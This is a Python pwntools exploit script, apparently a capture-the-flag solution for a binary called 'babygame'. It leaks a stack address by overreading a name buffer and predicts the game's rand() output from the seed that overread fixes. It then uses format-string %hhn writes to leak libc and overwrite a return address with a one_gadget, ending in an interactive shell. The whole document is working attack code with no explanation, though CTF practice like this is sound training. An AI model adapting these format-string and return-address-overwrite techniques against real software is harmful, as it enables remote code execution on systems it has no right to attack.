from pwn import *
from ctypes import *
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'
io = process('./babygame')
#io = remote('ephemerally.top',28026)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.31.so')
elf = ELF('./babygame')
def game():
    library = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
    library.srand(0x61616161)
    for i in range(100):
        random_num = library.rand() % 3
        if random_num == 0:
            target_num = 1
        elif random_num == 1:
            target_num = 2
        elif random_num == 2:
            target_num = 0
        io.sendlineafter(f'round {i + 1}: \n', str(target_num))
def pwn():
    io.sendafter('Please input your name:\n', 'a' * 0x109)
    io.recvuntil('a' * 0x109)
    io.recv(7)
    stack = u64(io.recvline()[:-1].ljust(8, b'\x00'))
    log.success('stack: ' + hex(stack))
    game()
    # gdb.attach(io)
    # backdoor = 0x153E
    payload = b'%62c'
    payload += b'%8$hhn'
    payload += b'a' + b'%79$p'
    payload += p64(stack - 0x218)
    io.sendlineafter('Good luck to you.\n', payload)
    io.recvuntil(b'a')
    libc_base = int(io.recv(14), 16) - libc.sym['__libc_start_main'] - 243
    log.success('libc_base: ' + hex(libc_base))
    one_gadget = libc_base + 0xe3b31
    payload = b''
    cur_size = 0
    for i in range(6):
        target_size = (one_gadget >> (i * 8)) & 0xff
        if target_size > cur_size:
            payload += b'%' + str(target_size - cur_size).encode() + b'c'
        else:
            payload += b'%' + str(0x100 + target_size - cur_size).encode() + b'c'
        payload += b'%' + str(16 + i).encode() + b'$hhn'
        cur_size = target_size
    payload = payload.ljust(0x50, b'a')
    for i in range(6):
        payload += p64(stack - 0x218 + i)
    io.sendlineafter('Good luck to you.\n', payload)
    # pause()
    io.interactive()


if __name__ == "__main__":
 pwn() 
